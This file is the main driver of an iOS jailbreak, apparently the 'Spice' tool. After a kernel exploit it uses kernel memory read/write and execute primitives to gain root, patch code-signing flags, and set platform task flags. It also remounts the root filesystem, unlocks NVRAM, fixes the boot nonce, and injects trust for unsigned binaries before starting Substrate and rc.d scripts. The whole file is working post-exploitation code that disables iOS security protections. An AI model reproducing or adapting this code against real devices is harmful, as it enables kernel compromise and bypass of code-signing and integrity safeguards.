#include <dlfcn.h>
#include <mach/mach.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/stat.h>

#include <archive.h>

#include "ArchiveFile.h"
#include "codesign.h"
#include "common.h"
#include "infoleak.h"
#include "kcall.h"
#include "kmem.h"
#include "kutils.h"
#include "nonce.h"
#include "pwn.h"
#include "remote.h"
#include "root.h"
#include "root_fs.h"
#include "utils.h"

#include "../untether/offsets.h"
#include "jailbreak.h"
#include "offsets.h"

#define MACH(func)                                                                        \
    ret = func;                                                                           \
    if (ret != KERN_SUCCESS) {                                                            \
        PWN_LOG(#func " (ln.%d) failed: %x (%s)", __LINE__, ret, mach_error_string(ret)); \
        goto out;                                                                         \
    }

#define VAL_CHECK(value)                                        \
    if ((value) == 0x0) {                                       \
        PWN_LOG("(ln.%d)failed to find " #value "!", __LINE__); \
        ret = KERN_FAILURE;                                     \
        goto out;                                               \
    }

offsets_t offs;
task_t kernel_task;
kptr_t kernel_slide;
kptr_t kernproc;

#include <errno.h>
#include <sys/sysctl.h>
#include <time.h>

// Shamelessly stolen from https://stackoverflow.com/a/11676260/
time_t bootsec()
{
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = { CTL_KERN, KERN_BOOTTIME };
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) {
        return -1.0;
    }
    return boottime.tv_sec;
}

kern_return_t jailbreak(uint32_t opt, void* controller, void (*sendLog)(void*, NSString*))
{
    offset_struct_t* myoffsets = malloc(sizeof(offset_struct_t));
    memset(myoffsets, 0, sizeof(offset_struct_t));
    populate_offsets(&offs, myoffsets);

    kern_return_t ret = 0;
    task_t self = mach_task_self();
    kptr_t kbase = 0;
    NSFileManager* fileMgr = [NSFileManager defaultManager];

#define PWN_LOG(...)                                                   \
    do {                                                               \
        sendLog(controller, [NSString stringWithFormat:@__VA_ARGS__]); \
        LOG(__VA_ARGS__);                                              \
    } while (0)
#ifdef __LP64__
#define PWN_LOG_KPTR(...) PWN_LOG("%s %llx\n", __VA_ARGS__)
#define FORMAT_KERNEL @"0x%016llx"
#else
#define PWN_LOG_KPTR(...) PWN_LOG("%s %x\n", __VA_ARGS__)
#define FORMAT_KERNEL @"0x%08x"
#endif
#define updateStage(stage) PWN_LOG("Jailbreaking... (%d/21)", stage)

    if (opt & JBOPT_POST_ONLY) {
        ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kernel_task);
        ASSERT_RET_PORT(out, "kernel_task", ret, kernel_task);
        task_dyld_info_data_t info;
        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
        ASSERT_RET(out, "task_info", task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&info, &cnt));
        kbase = (kptr_t)info.all_image_info_addr;
        PWN_LOG_KPTR("kbase", kbase);
    } else {
        // suspend_all_threads();

        ret = pwn_kernel(offs, &kernel_task, &kbase, controller, sendLog);

        // resume_all_threads();

        if (ret != KERN_SUCCESS)
            goto out;

        PWN_LOG("kernel been dun fucked");
    }

    kernel_slide = kbase - offs.constant.kernel_image_base;
    PWN_LOG_KPTR("kslide", kernel_slide);

    if (!MACH_PORT_VALID(kernel_task)) {
        PWN_LOG("invalid kernel task");
        goto out;
    }

    PWN_LOG("got kernel_task: %x\n", kernel_task);

    kernproc = kread_kptr(offs.data.kern_proc + kernel_slide);
    VAL_CHECK(kernproc);

    PWN_LOG_KPTR("kernproc:", kernproc);

    MACH(elevate_to_root());

    updateStage(15);

    MACH(init_kexecute(offs.data.zone_map, offs.gadgets.add_x0_x0_ret));

    kptr_t kexec_test = kexecute(offs.gadgets.add_x0_x0_ret, 1, 0x20);
    VAL_CHECK(kexec_test);

    kptr_t myproc = find_proc(getpid());
    VAL_CHECK(myproc);

    kptr_t mytask = kread_kptr(myproc + offs.struct_offsets.proc_task); // proc->task
    VAL_CHECK(mytask);

    {
        // patch our csflags
        uint32_t csflags = rk32(myproc + offs.struct_offsets.proc_p_csflags); // proc->p_csflags (_cs_restricted, first ldr offset)
        VAL_CHECK(csflags);
        PWN_LOG("current csflags: %x", csflags);

        csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
        wk32(myproc + offs.struct_offsets.proc_p_csflags, csflags);
        PWN_LOG("updated csflags: %x", csflags);
    }

    {
        // patch t_flags
        // bypasses task_conversion_eval checks
        uint32_t t_flags = rk32(mytask + offs.struct_offsets.task_t_flags); // task->t_flags
        VAL_CHECK(t_flags);

        PWN_LOG("current t_flags: %x", t_flags);
        t_flags |= 0x400; // TF_PLATFORM

        wk32(mytask + offs.struct_offsets.task_t_flags, t_flags);
        PWN_LOG("new t_flags: %x", t_flags);
    }

    MACH(remount_root_fs());
    PWN_LOG("remounted root fs");

    updateStage(16);

    fclose(fopen("/.cydia_no_stash", "w"));

    {
        // patch nvram
        MACH(unlock_nvram());
        PWN_LOG("patched nvram successfully");

        // set generator
        MACH(set_generator("0x1111111111111111"));

        const char* current_gen = get_generator();
        PWN_LOG("generator is set to: %s", current_gen);

        if (current_gen) {
            free((void*)current_gen);
        }

        // do we want to lock it down again?
        // leaving it unlocked allows ppl to set nonce from shell...
        // MACH(lock_nvram());
    }

    {
        // set dyld task info for kernel
        // note: this offset is pretty much the t_flags offset +0x8
        kptr_t kernel_task_addr = kread_kptr(offs.data.kernel_task + kernel_slide);
        kwrite_kptr(kernel_task_addr + offs.struct_offsets.task_all_image_info_addr, kbase); // task->all_image_info_addr
        kwrite_kptr(kernel_task_addr + offs.struct_offsets.task_all_image_info_size, kernel_slide); // task->all_image_info_size

        struct task_dyld_info dyld_info = { 0 };
        mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
        ret = task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
        PWN_LOG("task_info ret: %x (%s)", ret, mach_error_string(ret));

        if (ret == KERN_SUCCESS) {
            PWN_LOG("all_image_info_addr: %llx", dyld_info.all_image_info_addr);
            PWN_LOG("all_image_info_size: %llx", dyld_info.all_image_info_size);

            if (dyld_info.all_image_info_addr != kbase) {
                PWN_LOG("failed to set all_image_info_addr godammit");
            }

            if (dyld_info.all_image_info_size != kernel_slide) {
                PWN_LOG("failed to set all_image_info_size godammit");
            }
        }
    }

    // get bundle path
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesUrl = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* bundle_path = malloc(len);
    CFURLGetFileSystemRepresentation(resourcesUrl, TRUE, (UInt8*)bundle_path, len);
    PWN_LOG("bundle path: %s", bundle_path);

    // make sure this only gets run once per boot
    const char* doublebootcheck = [[NSString stringWithFormat:@"/tmp/spice.%lu", (unsigned long)bootsec()] UTF8String];
    if (access(doublebootcheck, F_OK) == 0) {
        PWN_LOG("We're already jailbroken silly");
        // spin for now
        while (1) { }
    }
    fclose(fopen(doublebootcheck, "w"));

    updateStage(17);

// TODO: hash checks on binaries
#define COPY_RESOURCE(name, to_path)                                                                                \
    do {                                                                                                            \
        unlink(to_path);                                                                                            \
        [fileMgr copyItemAtPath:[NSString stringWithFormat:@"%s/%s", bundle_path, name] toPath:@to_path error:nil]; \
        chown(to_path, 0, 0);                                                                                       \
        chmod(to_path, 755);                                                                                        \
    } while (0)

#define extractArchive(file) [[ArchiveFile archiveWithFile:@"/jb/bootstrap.tar.lzma"] extractToPath:@"/"]

#define EXTRACT_RESOURCE(resource, fs, extract) \
    do {                                        \
        COPY_RESOURCE(resource, fs);            \
        if (access(fs, F_OK) != 0) {            \
            PWN_LOG("Failed to find " fs);      \
            ret = KERN_FAILURE;                 \
            goto out;                           \
        }                                       \
        PWN_LOG("Extracting " fs);              \
        if (!extract(@fs)) {                    \
            PWN_LOG("Failed to extract " fs);   \
            ret = KERN_FAILURE;                 \
            goto out;                           \
        }                                       \
    } while (0)

    if (access("/jb", F_OK) != 0) {
        MACH(mkdir("/jb", 0755));

        if (access("/jb", F_OK) != 0) {
            PWN_LOG("failed to create /jb directory!");
            ret = KERN_FAILURE;
            goto out;
        }
    }

    {
        if ((opt & JBOPT_POST_ONLY) == 0) {
            if (access("/.spice_bootstrap_installed", F_OK) != 0) {
                EXTRACT_RESOURCE("bootstrap.tar.lzma", "/jb/bootstrap.tar.lzma", extractArchive);

                EXTRACT_RESOURCE("jailbreak-resources.deb", "/jb/jailbreak-resources.deb", extractDeb);

                fclose(fopen("/.spice_bootstrap_installed", "w+"));

                PWN_LOG("finished extracting bootstrap");

                {
                    // modify springboard settings plist so cydia shows

                    ret = execprog("/usr/bin/killall", (const char**)&(const char*[]) { "/usr/bin/killall", "-SIGSTOP", "cfprefsd", NULL });
                    if (ret != 0) {
                        PWN_LOG("failed to run killall(1): %d", ret);
                        ret = KERN_FAILURE;
                        goto out;
                    }

                    NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
                    [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
                    [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];

                    ret = execprog("/usr/bin/killall", (const char**)&(const char*[]) { "/usr/bin/killall", "-SIGSTOP", "cfprefsd", NULL });
                    if (ret != KERN_SUCCESS) {
                        PWN_LOG("failed to run killall(2): %d", ret);
                        ret = KERN_FAILURE;
                        goto out;
                    }

                    PWN_LOG("set SBShowNonDefaultSystemApps");
                }

                {
                    PWN_LOG("running uicache (this will take some time)...");

                    ret = execprog("/usr/bin/uicache", NULL);
                    if (ret != 0) {
                        PWN_LOG("failed to run uicache!");
                        ret = KERN_FAILURE;
                        goto out;
                    }

                    PWN_LOG("done!");
                }
            }
        } else if (access("/.spice_bootstrap_installed", F_OK) != 0) {
            PWN_LOG("big problem! we are in JBOPT_POST_ONLY mode but the bootstrap was not found!");
            return KERN_FAILURE;
        } else {
            PWN_LOG("JBOPT_POST_ONLY mode and bootstrap is present, all is well");
        }
    }

    {
        // check if substrate is not installed & install it from a deb file
        if ((opt & JBOPT_POST_ONLY) == 0) {
            if (access("/usr/libexec/substrate", F_OK) != 0) {
                PWN_LOG("substrate was not found? installing it...");

                EXTRACT_RESOURCE("mobilesubstrate.deb", "/jb/mobilesubstrate.deb", extractDeb);

                PWN_LOG("finished installing substrate");
            }
        }
    }

    updateStage(18);

    {
        // handle substrate's unrestrict library

        if (access("/Library/MobileSubstrate", F_OK) != 0) {
            mkdir("/Library/MobileSubstrate", 0755);
        }
        if (access("/Lbirary/MobileSubstrate/ServerPlugins", F_OK) != 0) {
            mkdir("/Library/MobileSubstrate/ServerPlugins", 0755);
        }

        if ((opt & JBOPT_POST_ONLY) == 0) {
            if (access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK) == 0) {
                unlink("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib");
                PWN_LOG("deleted old Unrestrict.dylib");
            }

            COPY_RESOURCE("Unrestrict.dylib", "/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib");
            PWN_LOG("unrestrict: %d", access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK));
        } else if (access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK) != 0) {
            PWN_LOG("note: JBOPT_POST_ONLY mode but unrestrict.dylib was not found");
        } else {
            PWN_LOG("JBOPT_POST_ONLY mode and unrestrict is present, all is well");
        }
    }

    updateStage(19);

    {
        NSMutableDictionary* dict = NULL;

        NSData* blob = [NSData dataWithContentsOfFile:@"/jb/offsets.plist"];
        if (blob != NULL) {
            dict = [NSPropertyListSerialization propertyListWithData:blob options:NSPropertyListMutableContainers format:nil error:nil];
        } else {
            dict = [[NSMutableDictionary alloc] init];
        }

        dict[@"AddRetGadget"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.gadgets.add_x0_x0_ret + kernel_slide];
        dict[@"KernProc"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.data.kern_proc + kernel_slide];
        dict[@"OSBooleanTrue"] = [NSString stringWithFormat:FORMAT_KERNEL, kread_kptr(kread_kptr(offs.data.osboolean_true + kernel_slide))];
        dict[@"OSBooleanFalse"] = [NSString stringWithFormat:FORMAT_KERNEL, kread_kptr(kread_kptr(offs.data.osboolean_true + sizeof(kptr_t) + kernel_slide))];
        dict[@"OSUnserializeXML"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.funcs.osunserializexml + kernel_slide];
        dict[@"ProcFind"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.funcs.proc_find + kernel_slide];
        dict[@"ProcRele"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.funcs.proc_rele + kernel_slide];
        dict[@"Smalloc"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.funcs.smalloc + kernel_slide];
        dict[@"ZoneMapOffset"] = [NSString stringWithFormat:FORMAT_KERNEL, offs.data.zone_map + kernel_slide];

        [dict writeToFile:@"/jb/offsets.plist" atomically:YES];
        PWN_LOG("wrote offsets.plist");

        chown("/jb/offsets.plist", 0, 0);
        chmod("/jb/offsets.plist", 0644);
    }

    {
        if (opt & JBOPT_POST_ONLY) {
            // spawing a bin to get amfid up
            execprog("/bin/bash", NULL);
        }
    }

    {
        if (access("/Library/Substrate", F_OK) == 0) {
            // move to old directory
            NSString* newPath = [NSString stringWithFormat:@"/Library/Substrate.%lu", (unsigned long)time(NULL)];
            PWN_LOG("moving /Library/Substrate to new path: %@", newPath);

            [fileMgr moveItemAtPath:@"/Library/Substrate" toPath:newPath error:nil];

            if (access("/Library/Substrate", F_OK) == 0) {
                PWN_LOG("failed to move /Library/Substrate!!");
                ret = KERN_FAILURE;
                goto out;
            }
        }

        mkdir("/Library/Substrate", 1755);

        if (access("/usr/libexec/substrate", F_OK) == 0) {
            inject_trust("/usr/libexec/substrate");

            ret = execprog("/usr/libexec/substrate", NULL);
            PWN_LOG("substrate ret: %d", ret);
        } else if (opt & JBOPT_POST_ONLY) {
            PWN_LOG("JBOPT_POST_ONLY and substrate was not found! something has gone horribly wrong");
            ret = KERN_FAILURE;
            goto out;
        } else {
            PWN_LOG("substrate was not found, why was it not installed?!?!");
            ret = KERN_FAILURE;
            goto out;
        }

        /*
         * if substrate fails to launch we're in trouble
         * we also need to be checking it's installed
         * before attempting to launch it
         * -- remember; it handles codesign patching
         */
    }

    updateStage(20);

    {
        // TODO: copy/check for launchctl
        MACH(inject_trust("/bin/launchctl"));

        // start launchdaemons
        ret = execprog("/bin/launchctl", (const char**)&(const char*[]) { "/bin/launchctl", "load", "-w", "/Library/LaunchDaemons", NULL });
        if (ret != 0) {
            PWN_LOG("failed to start launchdaemons: %d", ret);
        }
        PWN_LOG("started launchdaemons: %d", ret);

        // run rc.d scripts
        if (access("/etc/rc.d", F_OK) == 0) {
            // "No reason not to use it until it's removed" - sbingner, 12-11-2018
            typedef int (*system_t)(const char* command);
            system_t sys = dlsym(RTLD_DEFAULT, "system");

            NSArray* files = [fileMgr contentsOfDirectoryAtPath:@"/etc/rc.d" error:nil];

            for (NSString* file in files) {
                NSString* fullPath = [NSString stringWithFormat:@"/etc/rc.d/%@", file];

                // ignore substrate
                if ([fullPath isEqualToString:@"/etc/rc.d/substrate"] ||
                    [fullPath isEqualToString:@"/etc/rc.d/substrated"]) {
                    PWN_LOG("ignoring substrate...");
                    continue;
                }

                ret = sys([fullPath UTF8String]);

                // poor man's WEIEXITSTATUS
                PWN_LOG("ret on %s: %d\n", [fullPath UTF8String], (ret >> 8) & 0xff);
            }
        }
    }

    updateStage(21);

    {
        if ((opt & JBOPT_POST_ONLY) != 0) {
            PWN_LOG("finished post exploitation");

            // Removed because the double boot check should make it safe
            /*LOG("unloading prdaily...");

            ret = execprog("/bin/launchctl", (const char **)&(const char *[])
            {
                "/bin/launchctl",
                "unload",
                "/System/Library/LaunchDaemons/com.apple.prdaily.plist",
                NULL
            });
            if (ret != 0)
            {
                PWN_LOG("failed to unload prdaily! ret: %d", ret);
                ret = KERN_FAILURE;
                goto out;
            }

            PWN_LOG("prdaily unloaded\n");*/

            /* hope substrate is running by this point? */

            if (access("/usr/bin/ldrestart", F_OK) != 0) {
                PWN_LOG("failed to find ldrestart?!");
                ret = KERN_FAILURE;
                goto out;
            }

            ret = execprog("/usr/bin/ldrestart", NULL);
            if (ret != 0) {
                PWN_LOG("failed to execute ldrestart: %d", ret);
                ret = KERN_FAILURE;
                goto out;
            }
        }
    }

    ret = KERN_SUCCESS;

out:
    LOG("Restoring to mobile and exiting.");
    restore_to_mobile();

    term_kexecute();

    if (MACH_PORT_VALID(kernel_task)) {
        mach_port_deallocate(self, kernel_task);
    }

    return ret;
}
